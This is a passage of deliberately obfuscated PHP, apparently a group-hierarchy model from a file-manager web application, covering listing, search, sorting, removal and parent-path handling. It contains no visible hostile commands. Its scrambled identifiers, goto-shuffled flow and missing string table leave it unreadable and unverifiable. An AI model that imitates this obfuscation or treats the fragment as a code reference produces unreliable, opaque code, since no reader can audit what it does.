$Eé±Äøé‘Ó[$aÓ³‘”¹×·[1692]]); $this->cacheFunctionClear($aÓ³‘”¹×·[1765], $Eé±Äøé‘Ó[$aÓ³‘”¹×·[1692]]); } } private function _changeChildLevel($aÊ‚÷…Êï, $BŒ”¼©‹—Ä, $f™öÏ’ôÀ = false) { goto A¨—æ´î˜İ; açäêôš¡¸: if ($f™öÏ’ôÀ) { $d¾»Î…¦”é = $BŒ”¼©‹—Ä[$c¡àÅ¥ã®º[487]] . $BŒ”¼©‹—Ä[$c¡àÅ¥ã®º[1692]] . $c¡àÅ¥ã®º[47]; } $cé·ÍœïÚá = array($c¡àÅ¥ã®º[553] => array($c¡àÅ¥ã®º[512], $aÊ‚÷…Êï[$c¡àÅ¥ã®º[487]] . $aÊ‚÷…Êï[$c¡àÅ¥ã®º[1692]] . $c¡àÅ¥ã®º[513])); $B—ÑÖ¢ = array($c¡àÅ¥ã®º[553] => array($c¡àÅ¥ã®º[561], "\x72\145\x70\154\x61\x63\145\x28\160\141\162\x65\x6e\x74\114\x65\166\145\154\54\x27{$Bšé¹Ìç’î}\47\54\x27{$d¾»Î…¦”é}\x27\51")); goto añ™Í·îİ; A¨—æ´î˜İ: $c¡àÅ¥ã®º =& $_SERVER[œº]; $Bšé¹Ìç’î = $aÊ‚÷…Êï[$c¡àÅ¥ã®º[487]] . $aÊ‚÷…Êï[$c¡àÅ¥ã®º[1692]] . $c¡àÅ¥ã®º[47]; $d¾»Î…¦”é = $BŒ”¼©‹—Ä[$c¡àÅ¥ã®º[487]] . $BŒ”¼©‹—Ä[$c¡àÅ¥ã®º[1692]] . $c¡àÅ¥ã®º[47] . $aÊ‚÷…Êï[$c¡àÅ¥ã®º[1692]] . $c¡àÅ¥ã®º[47]; goto açäêôš¡¸; añ™Í·îİ: $this->_clearChildrenCache($aÊ‚÷…Êï); $this->where($cé·ÍœïÚá)->data($B—ÑÖ¢)->save(); goto D»î‹”ªÍÀ; D»î‹”ªÍÀ: } public function setNamePinyin($E‡Ú—‡„†, $DòÀ¿ëÍ³´ = false) { $aùÛ¼Ü“ËŞ =& $_SERVER[œº]; if (!$DòÀ¿ëÍ³´) { $dğô—ÈäÕÆ = $this->getInfoSimple($E‡Ú—‡„†); $DòÀ¿ëÍ³´ = $dğô—ÈäÕÆ[$aùÛ¼Ü“ËŞ[28]]; } if (!Input::check($DòÀ¿ëÍ³´, $aùÛ¼Ü“ËŞ[556])) { $this->metaSet($E‡Ú—‡„†, $aùÛ¼Ü“ËŞ[444], null); $this->metaSet($E‡Ú—‡„†, $aùÛ¼Ü“ËŞ[443], null); return; } $C»›ºÖ‹¤¼ = array($aùÛ¼Ü“ËŞ[444] => str_replace($aùÛ¼Ü“ËŞ[50], $aùÛ¼Ü“ËŞ[33], Pinyin::encode($DòÀ¿ëÍ³´)), $aùÛ¼Ü“ËŞ[443] => Pinyin::encode($DòÀ¿ëÍ³´, $aùÛ¼Ü“ËŞ[557])); $this->metaSet($E‡Ú—‡„†, $C»›ºÖ‹¤¼); } protected function groupStatus($A¶‹Ã¢³“, $FîÒ‹øùµè) { goto a™¨¬¾¥‘ğ; A‹è—¶î“: if ($FîÒ‹øùµè == $EÑà¯³ó¶Š[87]) { $CºØ­ù¶Â = $this->parentLevelArray($fİê÷—âõ[$EÑà¯³ó¶Š[487]]); } else { $fÒ¡ËÇêÈß = array($EÑà¯³ó¶Š[553] => array($EÑà¯³ó¶Š[512], $fİê÷—âõ[$EÑà¯³ó¶Š[487]] . $fİê÷—âõ[$EÑà¯³ó¶Š[1692]] . $EÑà¯³ó¶Š[513])); $CºØ­ù¶Â = $this->where($fÒ¡ËÇêÈß)->field($EÑà¯³ó¶Š[1692])->select(); $CºØ­ù¶Â = array_to_keyvalue($CºØ­ù¶Â, $EÑà¯³ó¶Š[33], $EÑà¯³ó¶Š[1692]); } $CºØ­ù¶Â[] = $fİê÷—âõ[$EÑà¯³ó¶Š[1692]]; $D‡ğİ£ÚÜ = array(); goto a†™¯ä±Å; a†™¯ä±Å: foreach ($CºØ­ù¶Â as $A¶‹Ã¢³“) { $D‡ğİ£ÚÜ[] = array($EÑà¯³ó¶Š[1692] => $A¶‹Ã¢³“, $EÑà¯³ó¶Š[93] => $EÑà¯³ó¶Š[710], $EÑà¯³ó¶Š[372] => $FîÒ‹øùµè); } return Model($EÑà¯³ó¶Š[1772])->addAll($D‡ğİ£ÚÜ, array(), !0); goto A…’‚°µôø; a™¨¬¾¥‘ğ: $EÑà¯³ó¶Š =& $_SERVER[œº]; $fİê÷—âõ = $this->getInfoSimple($A¶‹Ã¢³“); if (!$fİê÷—âõ) { return !1; } goto A‹è—¶î“; A…’‚°µôø: } protected function groupRemove($F›ØÈéô‚ƒ) { goto EÛáÇ›½Õ¸; f¦äÉğİØ¶: $this->where(array($b’Ä»ã‘ó…[478] => $F›ØÈéô‚ƒ))->save(array($b’Ä»ã‘ó…[478] => $Eäø´¯òé[$b’Ä»ã‘ó…[478]])); Model($b’Ä»ã‘ó…[1772])->where($A«‚ìÏÁ ”)->delete(); Model($b’Ä»ã‘ó…[1773])->where($A«‚ìÏÁ ”)->delete(); goto b¿¸ä‡“‘ª; EÛáÇ›½Õ¸: $b’Ä»ã‘ó… =& $_SERVER[œº]; $A«‚ìÏÁ ” = array($b’Ä»ã‘ó…[1692] => $F›ØÈéô‚ƒ); $Eäø´¯òé = $this->where($A«‚ìÏÁ ”)->find(); goto e¸Üí²¥å; b¿¸ä‡“‘ª: Model($b’Ä»ã‘ó…[790])->groupRootRemove($F›ØÈéô‚ƒ); return $this->where($A«‚ìÏÁ ”)->delete(); goto DÓŒ²ÚÍ‡“; e¸Üí²¥å: if (!$Eäø´¯òé || $Eäø´¯òé[$b’Ä»ã‘ó…[478]] == 0) { return !1; } $E‘‹œãŠñÄ = $this->getInfoSimple($Eäø´¯òé[$b’Ä»ã‘ó…[478]]); $this->_changeChildLevel($Eäø´¯òé, $E‘‹œãŠñÄ, !0); goto f¦äÉğİØ¶; DÓŒ²ÚÍ‡“: } protected function groupSort($e‚êøĞ¿„) { $B®×Ï©Œİ‡ =& $_SERVER[œº]; $e‰Ô„ÛŠÜ© = array(); foreach ($e‚êøĞ¿„ as $fæäëŞªŠ† => $CŒğ‘†¢Ç–) { $e‰Ô„ÛŠÜ©[] = array($B®×Ï©Œİ‡[1692], $CŒğ‘†¢Ç–, $B®×Ï©Œİ‡[1715], $fæäëŞªŠ† + 1); } $this->saveAll($e‰Ô„ÛŠÜ©); } public function listData() { $câÁïÎÃ˜È = $this->_makeOrder()->selectPage(50); $this->_listDataApply($câÁïÎÃ˜È[$_SERVER[œº][367]]); return $câÁïÎÃ˜È; } private function _makeOrder($A„Ëƒ’òì¿ = '') { goto e¾ƒ½´õÀÉ; Aïğ¶˜ÎØì: $BãíŸ®óêø = Input::get($c…ÄØ½à‹Ä[435], $c…ÄØ½à‹Ä[7], $c…ÄØ½à‹Ä[1696], $D¥ëáÏÊ®); $F‰ŸŞ„¸‡¦ = Input::get($c…ÄØ½à‹Ä[436], $c…ÄØ½à‹Ä[7], $c…ÄØ½à‹Ä[1774], array($c…ÄØ½à‹Ä[1774], $c…ÄØ½à‹Ä[430])); $F‰ŸŞ„¸‡¦ = $EÅ‹Ú©ÏÍÒ[$F‰ŸŞ„¸‡¦]; goto E©´ŒÍÉ¡á; e¾ƒ½´õÀÉ: $c…ÄØ½à‹Ä =& $_SERVER[œº]; $D¥ëáÏÊ® = array($c…ÄØ½à‹Ä[1692], $c…ÄØ½à‹Ä[28], $c…ÄØ½à‹Ä[1678], $c…ÄØ½à‹Ä[194]); $EÅ‹Ú©ÏÍÒ = array($c…ÄØ½à‹Ä[428] => $c…ÄØ½à‹Ä[429], $c…ÄØ½à‹Ä[430] => $c…ÄØ½à‹Ä[431]); goto Aïğ¶˜ÎØì; E©´ŒÍÉ¡á: $A„Ëƒ’òì¿ = $A„Ëƒ’òì¿ . "{$BãíŸ®óêø}\40{$F‰ŸŞ„¸‡¦}\54\40\x67\x72\x6f\x75\160\x49\104\40\x61\163\x63"; return $this->order($A„Ëƒ’òì¿); goto eÖÍŸğ·Œª; eÖÍŸğ·Œª: } public function listChild($F¨ÑÄ·ÂŒ÷) { $D¢± íË´§ =& $_SERVER[œº]; $c‰‘çñ¡íƒ = $this->where(array($D¢± íË´§[478] => $F¨ÑÄ·ÂŒ÷))->_makeOrder()->selectPage(200); $this->_listDataApply($c‰‘çñ¡íƒ[$D¢± íË´§[367]]); return $c‰‘çñ¡íƒ; } public function listByID($d‘Ş”Ûœã) { $c½Ôï ™¥— =& $_SERVER[œº]; if (!$d‘Ş”Ûœã) { return array(); } $DŒœÖÚ¿ = array($c½Ôï ™¥—[1692] => array($c½Ôï ™¥—[7], $d‘Ş”Ûœã)); $fÅÚÔŒÕµ = $this->where($DŒœÖÚ¿)->select(); $this->_listDataApply($fÅÚÔŒÕµ); return $fÅÚÔŒÕµ; } public function listSearch($e¤±ã¶) { goto c¸›œÂ¶Ú; bİö¦Èß„Â: if ($AÛŸØĞ—Œ‚) { $Fë«®©„¢ = $this->getInfoSimple($AÛŸØĞ—Œ‚); $c“ç¬–»íõ = $Fë«®©„¢[$DÄ”íÆİ–÷[487]] . $AÛŸØĞ—Œ‚ . $DÄ”íÆİ–÷[513]; $bëâÏí–êô = array($bëâÏí–êô, array($DÄ”íÆİ–÷[487] => array($DÄ”íÆİ–÷[380], $c“ç¬–»íõ))); } $bëâÏí–êô = $this->parseWhereLike($bëâÏí–êô); $Bˆƒ³ÙÒÜ = $this->_makeOrder()->where($bëâÏí–êô)->selectPage(20); goto Eƒ ÆÎóŞ™; Eƒ ÆÎóŞ™: $Bˆƒ³ÙÒÜ = $Bˆƒ³ÙÒÜ ? $Bˆƒ³ÙÒÜ : array($DÄ”íÆİ–÷[367] => array(), $DÄ”íÆİ–÷[364] => array()); if (!$Bˆƒ³ÙÒÜ || count($Bˆƒ³ÙÒÜ[$DÄ”íÆİ–÷[367]]) < 5 && Input::check($a¢¡ÍùÛÍ–, $DÄ”íÆİ–÷[316])) { goto D‚éŞîÀ¤; dË¸ª‚÷“: $B¸„ô§ßÅà = array_merge($eñ‘ÇÂñí, $f‹™£­•Âƒ, $Bˆƒ³ÙÒÜ[$DÄ”íÆİ–÷[367]]); $Bˆƒ³ÙÒÜ[$DÄ”íÆİ–÷[367]] = array_unique_by_key($B¸„ô§ßÅà, $DÄ”íÆİ–÷[1692]); $Bˆƒ³ÙÒÜ[$DÄ”íÆİ–÷[364]][$DÄ”íÆİ–÷[365]] = count($Bˆƒ³ÙÒÜ[$DÄ”íÆİ–÷[367]]); goto C½šê‰´à; C½šê‰´à: $Bˆƒ³ÙÒÜ[$DÄ”íÆİ–÷[364]][$DÄ”íÆİ–÷[366]] = ceil($Bˆƒ³ÙÒÜ[$DÄ”íÆİ–÷[364]][$DÄ”íÆİ–÷[365]] / $Bˆƒ³ÙÒÜ[$DÄ”íÆİ–÷[364]][$DÄ”íÆİ–÷[361]]); goto D×‚™¸šÇË; D‚éŞîÀ¤: $Aáé±Ç¿ç = $this->groupChildrenAll($AÛŸØĞ—Œ‚); $eñ‘ÇÂñí = $this->_searchFromMeta($DÄ”íÆİ–÷[443], $a¢¡ÍùÛÍ–, 10, $Aáé±Ç¿ç); $f‹™£­•Âƒ = $this->_searchFromMeta($DÄ”íÆİ–÷[444], $a¢¡ÍùÛÍ–, 10, $Aáé±Ç¿ç); goto dË¸ª‚÷“; D×‚™¸šÇË: } $this->_listDataApply($Bˆƒ³ÙÒÜ[$DÄ”íÆİ–÷[367]]); goto Fàˆôˆ­Š©; Fàˆôˆ­Š©: return $Bˆƒ³ÙÒÜ; goto f–Ú÷ùˆ­Ó; c¸›œÂ¶Ú: $DÄ”íÆİ–÷ =& $_SERVER[œº]; $a¢¡ÍùÛÍ– = $e¤±ã¶[$DÄ”íÆİ–÷[1775]]; $AÛŸØĞ—Œ‚ = isset($e¤±ã¶[$DÄ”íÆİ–÷[1776]]) ? $e¤±ã¶[$DÄ”íÆİ–÷[1776]] : !1; goto B´Ù‡À¢Ì®; B´Ù‡À¢Ì®: if (!trim($a¢¡ÍùÛÍ–)) { return !1; } $a¢¡ÍùÛÍ– = str_replace($DÄ”íÆİ–÷[1777], $DÄ”íÆİ–÷[1778], $a¢¡ÍùÛÍ–); $bëâÏí–êô = array($DÄ”íÆİ–÷[1692] => array($DÄ”íÆİ–÷[380], "{$a¢¡ÍùÛÍ–}\x25"), $DÄ”íÆİ–÷[28] => array($DÄ”íÆİ–÷[380], "\x25{$a¢¡ÍùÛÍ–}\45"), $DÄ”íÆİ–÷[957] => $DÄ”íÆİ–÷[1779]); goto bİö¦Èß„Â; f–Ú÷ùˆ­Ó: } protected function groupChildrenAll($b¨È¬Ç…À«) { $EÆÏß¢ˆÅî =& $_SERVER[œº]; if (!$b¨È¬Ç…À«) { return !1; } if (is_string($b¨È¬Ç…À«)) { $b¨È¬Ç…À« = array($b¨È¬Ç…À«); } $b‚Ÿ¨ß³ä© = $b¨È¬Ç…À«; foreach ($b¨È¬Ç…À« as $eàÃ¹ÀõèÃ) { $cÛ†É³ßÚŠ = $this->getInfoSimple($eàÃ¹ÀõèÃ); $c•ŞçÄÔĞø = array($EÆÏß¢ˆÅî[487] => array($EÆÏß¢ˆÅî[380], $cÛ†É³ßÚŠ[$EÆÏß¢ˆÅî[487]] . $eàÃ¹ÀõèÃ . $EÆÏß¢ˆÅî[513])); $CÉ‘„Åµ·ç = $this->field($EÆÏß¢ˆÅî[1692])->where($c•ŞçÄÔĞø)->select(); $b‚Ÿ¨ß³ä© = array_merge($b‚Ÿ¨ß³ä©, array_to_keyvalue($CÉ‘„Åµ·ç, $EÆÏß¢ˆÅî[33], $EÆÏß¢ˆÅî[1692])); } return array_unique($b‚Ÿ¨ß³ä©); } private function _searchFromMeta($D÷Ó‹·Ø˜, $cÓ¸÷øÜï«, $b®ï¥Ÿ¬®ª, $bòùÆ“øø™) { goto Dãí¤¯»ˆ¼; Dãí¤¯»ˆ¼: $F÷–òÇç˜Ü =& $_SERVER[œº]; $cÓ¸÷øÜï« = strtolower($cÓ¸÷øÜï«); $däšªŞÃÓô = array($F÷–òÇç˜Ü[93] => $D÷Ó‹·Ø˜, $F÷–òÇç˜Ü[372] => array($F÷–òÇç˜Ü[380], "\45{$cÓ¸÷øÜï«}\45")); goto fÒã¨ÂÃŠÚ; C¶¯ªØÓŠ‘: if (!$cî¬ÎÊàš) { return array(); } return $cî¬ÎÊàš; goto aÓÀÑ‡÷¶®; fÒã¨ÂÃŠÚ: $däšªŞÃÓô = $this->parseWhereLike($däšªŞÃÓô); if ($bòùÆ“øø™) { $däšªŞÃÓô[$F÷–òÇç˜Ü[1692]] = array($F÷–òÇç˜Ü[7], $bòùÆ“øø™); } $AÓŠ¾Ğ”á = Model($F÷–òÇç˜Ü[1780])->where($däšªŞÃÓô)->limit($b®ï¥Ÿ¬®ª)->select(); goto Aù¨‹­–Ÿ’; Aù¨‹­–Ÿ’: if (!$AÓŠ¾Ğ”á) { return array(); } $AÓŠ¾Ğ”á = array_to_keyvalue($AÓŠ¾Ğ”á, $F÷–òÇç˜Ü[33], $F÷–òÇç˜Ü[1692]); $cî¬ÎÊàš = $this->where(array($F÷–òÇç˜Ü[1770] => array($F÷–òÇç˜Ü[7], $AÓŠ¾Ğ”á)))->select(); goto C¶¯ªØÓŠ‘; aÓÀÑ‡÷¶®: } protected function _listDataApplyItem($câ™¸é—§÷) { $fêªÊ¡Šğ = array($câ™¸é—§÷); $this->_listDataApply($fêªÊ¡Šğ); return $fêªÊ¡Šğ[0]; } protected function _listDataApply(&$F¨Ï‰Ş×ÃÁ) { goto F¾âñŞ¿; F¾âñŞ¿: $BÕï¾ïŠ©á =& $_SERVER[œº]; if (!$F¨Ï‰Ş×ÃÁ) { return; } $d‹Õ“»š÷ = array_to_keyvalue($F¨Ï‰Ş×ÃÁ, $BÕï¾ïŠ©á[33], $BÕï¾ïŠ©á[1692]); goto bÖçøíàä–; Dì‚çÓ´‘¾: $this->_listAppendParent($F¨Ï‰Ş×ÃÁ); $this->_listAppendSourceRoot($F¨Ï‰Ş×ÃÁ, $d‹Õ“»š÷); goto E¹Ù¼ÛÁì; bÖçøíàä–: $this->_listAppendChildren($F¨Ï‰Ş×ÃÁ); $this->_listAppendChildrenMember($F¨Ï‰Ş×ÃÁ); $this->_listAppendMeta($F¨Ï‰Ş×ÃÁ, $d‹Õ“»š÷); goto Dì‚çÓ´‘¾; E¹Ù¼ÛÁì: } private function _listAppendChildren(&$C†óª¦¯Üé) { goto fø‡²É§‹„; eÇ×õéª—±: $D‰ƒ¸¯™¹Œ = array($f“»ïáã¬‰[478], $f“»ïáã¬‰[1781] => $f“»ïáã¬‰[480]); $Ağ¡”äÅŞä = $this->field($D‰ƒ¸¯™¹Œ)->where($bœ’¥µ)->group($f“»ïáã¬‰[478])->select(); $FæÜÙŸøÏ† = array_to_keyvalue($Ağ¡”äÅŞä, $f“»ïáã¬‰[478], $f“»ïáã¬‰[480]); goto EÂ¿„‘Îƒ; EÂ¿„‘Îƒ: foreach ($C†óª¦¯Üé as &$f¥÷öˆßâí) { $EŸÅíİ²äœ = $f¥÷öˆßâí[$f“»ïáã¬‰[1692]]; $f¥÷öˆßâí[$f“»ïáã¬‰[1782]] = isset($FæÜÙŸøÏ†[$EŸÅíİ²äœ]) ? intval($FæÜÙŸøÏ†[$EŸÅíİ²äœ]) : !1; } unset($f¥÷öˆßâí); goto AÇá‘ÓÒ©â; fø‡²É§‹„: $f“»ïáã¬‰ =& $_SERVER[œº]; $fÆ¨²Ä¶”Ÿ = array_to_keyvalue($C†óª¦¯Üé, $f“»ïáã¬‰[33], $f“»ïáã¬‰[1692]); $bœ’¥µ = array($f“»ïáã¬‰[478] => array($f“»ïáã¬‰[7], $fÆ¨²Ä¶”Ÿ)); goto eÇ×õéª—±; AÇá‘ÓÒ©â: } private function _listAppendChildrenMember(&$Aáâí„İâÃ) { goto d†‘–Ó‘áĞ; eÀ÷ÒêµóŠ: $E†˜ÖÌ’Ë” = array($a˜‹°†ĞÅƒ[1692], $a˜‹°†ĞÅƒ[1781] => $a˜‹°†ĞÅƒ[480]); $D‚¶õí¿ = Model($a˜‹°†ĞÅƒ[1773])->field($E†˜ÖÌ’Ë”)->where($A›‰ï½îÈ)->group($a˜‹°†ĞÅƒ[1692])->select(); $D‰†Ì¼Ø˜´ = array_to_keyvalue($D‚¶õí¿, $a˜‹°†ĞÅƒ[1692], $a˜‹°†ĞÅƒ[480]); goto BŠÃ¸«‡‘; BŠÃ¸«‡‘: foreach ($Aáâí„İâÃ as &$aœˆ„áªÄô) { $C¯ğÉ–óË = $aœˆ„áªÄô[$a˜‹°†ĞÅƒ[1692]]; $aœˆ„áªÄô[$a˜‹°†ĞÅƒ[1783]] = isset($D‰†Ì¼Ø˜´[$C¯ğÉ–óË]) ? intval($D‰†Ì¼Ø˜´[$C¯ğÉ–óË]) : !1; } unset($aœˆ„áªÄô); goto D¶×Ôš­Ğ; d†‘–Ó‘áĞ: $a˜‹°†ĞÅƒ =& $_SERVER[œº]; $FŒ‡…ãŒÊ = array_to_keyvalue($Aáâí„İâÃ, $a˜‹°†ĞÅƒ[33], $a˜‹°†ĞÅƒ[1692]); $A›‰ï½îÈ = array($a˜‹°†ĞÅƒ[1692] => array($a˜‹°†ĞÅƒ[7], $FŒ‡…ãŒÊ)); goto eÀ÷ÒêµóŠ; D¶×Ôš­Ğ: } private function _listAppendMeta(&$bøàá…•ôÎ, $bĞ¿¡·µî‡) { goto F¤ñßÚò´; aÂóÈåé: $aß‹Ää°ÍÕ = array_to_keyvalue_group($aß‹Ää°ÍÕ, $EÎ°â½¿øô[1692]); foreach ($aß‹Ää°ÍÕ as &$C°£¯Ñôª†) { $C°£¯Ñôª† = array_to_keyvalue($C°£¯Ñôª†, $EÎ°â½¿øô[93], $EÎ°â½¿øô[372]); } unset($C°£¯Ñôª†); goto B˜·ƒæõ; B˜·ƒæõ: foreach ($bøàá…•ôÎ as &$eÉ–â½Áµ‡) { $eÉ–â½Áµ‡[$EÎ°â½¿øô[445]] = array(); if (isset($aß‹Ää°ÍÕ[$eÉ–â½Áµ‡[$EÎ°â½¿øô[1692]]])) { $eÉ–â½Áµ‡[$EÎ°â½¿øô[445]] = $aß‹Ää°ÍÕ[$eÉ–â½Áµ‡[$EÎ°â½¿øô[1692]]]; } } unset($eÉ–â½Áµ‡); goto CŸÀ‘İˆ’í; F¤ñßÚò´: $EÎ°â½¿øô =& $_SERVER[œº]; $Cµ›†‚Ö¤º = array($EÎ°â½¿øô[1692] => array($EÎ°â½¿øô[7], $bĞ¿¡·µî‡)); $aß‹Ää°ÍÕ = Model($EÎ°â½¿øô[1772])->where($Cµ›†‚Ö¤º)->select(); goto aÂóÈåé; CŸÀ‘İˆ’í: } protected function parentLevelArray($F­†Ìœ„İ) { $cÇ®×‚ˆ‰Ç =& $_SERVER[œº]; $F­†Ìœ„İ = explode($cÇ®×‚ˆ‰Ç[47], trim($F­†Ìœ„İ, $cÇ®×‚ˆ‰Ç[47])); $F­†Ìœ„İ = array_remove_value($F­†Ìœ„İ, $cÇ®×‚ˆ‰Ç[191]); return $F­†Ìœ„İ; } private function _listAppendParent(&$DÁ¹•¬ÌÑ¶) { goto b÷¡áåÑğ; D‘ªãè Û‡: unset($f½ó„½¯¼¬); foreach ($c­÷àÒƒøˆ as $bÏ‡‚•Œ¸­ => $Eù•Œ©–Æ³) { if ($Eù•Œ©–Æ³) { continue; } $B£“ñó¹®İ = $this->getInfoSimple($bÏ‡‚•Œ¸­); $c­÷àÒƒøˆ[$bÏ‡‚•Œ¸­] = $B£“ñó¹®İ[$EÚÌ¨®àƒ£[28]]; } $eŠíÑğñ‹Ñ = $GLOBALS[$EÚÌ¨®àƒ£[6]][$EÚÌ¨®àƒ£[88]][$EÚÌ¨®àƒ£[1784]]; goto cĞÒ®¥­æ„; b÷¡áåÑğ: $EÚÌ¨®àƒ£ =& $_SERVER[œº]; $c­÷àÒƒøˆ = array(); foreach ($DÁ¹•¬ÌÑ¶ as &$f½ó„½¯¼¬) { $c­÷àÒƒøˆ[$f½ó„½¯¼¬[$EÚÌ¨®àƒ£[1692]]] = $f½ó„½¯¼¬[$EÚÌ¨®àƒ£[28]]; $E»Â¢´¤œì = $this->parentLevelArray($f½ó„½¯¼¬[$EÚÌ¨®àƒ£[487]]); foreach ($E»Â¢´¤œì as $Bİ¦¤ó¢è) { if (!isset($c­÷àÒƒøˆ[$Bİ¦¤ó¢è])) { $c­÷àÒƒøˆ[$Bİ¦¤ó¢è] = 0; } } } goto D‘ªãè Û‡; cĞÒ®¥­æ„: if ($GLOBALS[$EÚÌ¨®àƒ£[485]] == $EÚÌ¨®àƒ£[87]) { $eŠíÑğñ‹Ñ = !1; } foreach ($DÁ¹•¬ÌÑ¶ as &$f½ó„½¯¼¬) { $E»Â¢´¤œì = $this->parentLevelArray($f½ó„½¯¼¬[$EÚÌ¨®àƒ£[487]]); $Aì¼Ğ¸Ô  = $EÚÌ¨®àƒ£[33]; foreach ($E»Â¢´¤œì as $bÏ‡‚•Œ¸­ => $Bİ¦¤ó¢è) { if ($eŠíÑğñ‹Ñ && $bÏ‡‚•Œ¸­ == 0) { continue; } $Aì¼Ğ¸Ô  .= $c­÷àÒƒøˆ[$Bİ¦¤ó¢è] . $EÚÌ¨®àƒ£[8]; } if ($E»Â¢´¤œì) { $Aì¼Ğ¸Ô  .= $f½ó„½¯¼¬[$EÚÌ¨®àƒ£[28]]; } $f½ó„½¯¼¬[$EÚÌ¨®àƒ£[491]] = str_replace($EÚÌ¨®àƒ£[496], $EÚÌ¨®àƒ£[8], $Aì¼Ğ¸Ô ); } unset($f½ó„½¯¼¬); goto bƒ¨„¼‹–è; bƒ¨„¼‹–è: } private function _listAppendSourceRoot(&$eÚªÜ¬“ØÛ, $C‚‰½Ôæ¬) { goto b‰å™·êÌ; b‰å™·êÌ: $EƒÆÊÅ¯Ã‹ =& $_SERVER[œº]; $D”¿«Ö¡Û = array($EƒÆÊÅ¯Ã‹[404] => SourceModel::TYPE_GROUP, $EƒÆÊÅ¯Ã‹[478] => 0, $EƒÆÊÅ¯Ã‹[484] => array($EƒÆÊÅ¯Ã‹[7], $C‚‰½Ôæ¬)); $eÈæ«’£àó = $EƒÆÊÅ¯Ã‹[1785]; goto a™– ©ºë‘; a™– ©ºë‘: $dÙ‘ÖïóŒ = Model($EƒÆÊÅ¯Ã‹[790])->order($EƒÆÊÅ¯Ã‹[1786])->field($eÈæ«’£àó)->where($D”¿«Ö¡Û)->select(); $dÙ‘ÖïóŒ = array_to_keyvalue($dÙ‘ÖïóŒ, $EƒÆÊÅ¯Ã‹[484]); $dÙ‘ÖïóŒ = array_remove_key($dÙ‘ÖïóŒ, $EƒÆÊÅ¯Ã‹[484]); goto cØ”»ÃƒŒä; cØ”»ÃƒŒä: foreach ($eÚªÜ¬“ØÛ as &$c®¶›Şà¢) { $c®¶›Şà¢[$EƒÆÊÅ¯Ã‹[85]] = $dÙ‘ÖïóŒ[$c®¶›Şà¢[$EƒÆÊÅ¯Ã‹[1692]]] ? $dÙ‘ÖïóŒ[$c®¶›Şà¢[$EƒÆÊÅ¯Ã‹[1692]]] : array(); } unset($c®¶›Şà¢); goto a†øìÔï¥Ÿ; a†øìÔï¥Ÿ: } protected function groupMerge($C¥»×…œ) { $C¥»×…œ = array_values(array_unique($C¥»×…œ)); $aö ”»¢Ÿ = array(); for ($cºš¶‘ôÏš = 0; $cºš¶‘ôÏš < count($C¥»×…œ); $cºš¶‘ôÏš++) { $b‡—Í±ª¿Ğ = !1; for ($c‹Üçî¡ùí = 0; $c‹Üçî¡ùí < count($C¥»×…œ); $c‹Üçî¡ùí++) { if ($cºš¶‘ôÏš == $c‹Üçî¡ùí) { continue; } if ($this->isParentOf($C¥»×…œ[$c‹Üçî¡ùí], $C¥»×…œ[$cºš¶‘ôÏš])) { $b‡—Í±ª¿Ğ = !0; break; } } if (!$b‡—Í±ª¿Ğ) { $aö ”»¢Ÿ[] = $C¥»×…œ[$cºš¶‘ôÏš]; } } return $aö ”»¢Ÿ; } protected function isParentOf($E¼Î¹öÂ·ô, $dÖÃ´¹ƒÍ÷) { goto D˜íºÑƒçÏ; D˜íºÑƒçÏ: $FÇËØÙ¦Š­ =& $_SERVER[œº]; if (!$E¼Î¹öÂ·ô || !$dÖÃ´¹ƒÍ÷ || $E¼Î¹öÂ·ô == $dÖÃ´¹ƒÍ÷) { return !1; } $fó”ã×ôÙˆ = $this->getInfoSimple($E¼Î¹öÂ·ô); goto Cæ¸ÅøĞÖ; CœšÕ›Ï®Ü: return !1; goto bèç‘â·¢®; Cæ¸ÅøĞÖ: $dòíëÚª–” = $this->getInfoSimple($dÖÃ´¹ƒÍ÷); $f½ù¸ñ®®Œ = $fó”ã×ôÙˆ[$FÇËØÙ¦Š­[487]] . $E¼Î¹öÂ·ô . $FÇËØÙ¦Š­[47]; if (substr($dòíëÚª–”[$FÇËØÙ¦Š­[487]], 0, strlen($f½ù¸ñ®®Œ)) == $f½ù¸ñ®®Œ) { return !0; } goto CœšÕ›Ï®Ü; bèç‘â·¢®: } public function groupShowRoot($D¡¿òš „Û, $b›ªÂãÙßµ = false) { goto D´›ÕµÔƒ; f†ŠŒÛ–ÃÅ: $Dƒë‘¡˜è = $this->parentLevelArray($AÖùĞô–Œ[$e‡’ˆ£…±×[487]]); $DùÆæŒ¡¢ = array($D¡¿òš „Û); if (count($Dƒë‘¡˜è) == 0) { return $DùÆæŒ¡¢; } goto fª™Ÿà«¤–; cÙåì‚ê£ê: return $DùÆæŒ¡¢; goto A­Âëõ½Ã; fª™Ÿà«¤–: if ($b›ªÂãÙßµ && count($Dƒë‘¡˜è) == 1) { return $DùÆæŒ¡¢; } if (!$AÖùĞô–Œ[$e‡’ˆ£…±×[445]] || !isset($AÖùĞô–Œ[$e‡’ˆ£…±×[445]][$e‡’ˆ£…±×[1768]]) || $AÖùĞô–Œ[$e‡’ˆ£…±×[445]][$e‡’ˆ£…±×[1768]] == $e‡’ˆ£…±×[1742]) { return $this->groupShowRoot($Dƒë‘¡˜è[count($Dƒë‘¡˜è) - 1], $b›ªÂãÙßµ); } if ($AÖùĞô–Œ[$e‡’ˆ£…±×[445]][$e‡’ˆ£…±×[1768]] == $e‡’ˆ£…±×[357]) { $EÛÑéñİÆ = explode($e‡’ˆ£…±×[47], $AÖùĞô–Œ[$e‡’ˆ£…±×[445]][$e‡’ˆ£…±×[1769]]); if ($EÛÑéñİÆ) { $DùÆæŒ¡¢ = array_merge($DùÆæŒ¡¢, $EÛÑéñİÆ); } } goto cÙåì‚ê£ê; D´›ÕµÔƒ: $e‡’ˆ£…±× =& $_SERVER[œº]; $AÖùĞô–Œ = $this->getInfo($D¡¿òš „Û); if (!$AÖùĞô–Œ) { return array(); } goto f†ŠŒÛ–ÃÅ; A­Âëõ½Ã: } protected function resetParentLevel() { $BİÅœò­¬ =& $_SERVER[œº]; $B¶§‰™åÌî = $BİÅœò­¬[1692]; $E‚‰šÇ“ê = $this->select(); $E‚‰šÇ“ê = array_to_keyvalue($E‚‰šÇ“ê, $B¶§‰™åÌî); foreach ($E‚‰šÇ“ê as $A„×—ç™®) { goto fÅ’ÌŠÔ‰; FáßË¹…¾Û: $this->where(array($B¶§‰™åÌî => $A„×—ç™®[$B¶§‰™åÌî]))->save(array($BİÅœò­¬[553] => $e¡Š‚ÊŞ× )); goto eÕ¢³¦öªÚ; fÅ’ÌŠÔ‰: $cà¦¾•– = $A„×—ç™®; $e¡Š‚ÊŞ×  = array(); while 